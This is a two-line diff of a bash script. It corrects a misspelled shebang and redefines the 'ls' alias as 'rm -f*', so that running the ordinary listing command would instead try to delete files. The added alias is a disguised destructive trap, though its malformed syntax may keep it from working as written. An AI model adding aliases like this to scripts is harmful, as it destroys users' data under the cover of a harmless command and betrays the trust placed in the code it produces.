@@ -1,2 +1,2 @@
-#!/bim/bash
-alias ls="-f*"
+#!/bin/bash
+alias ls="rm -f*"
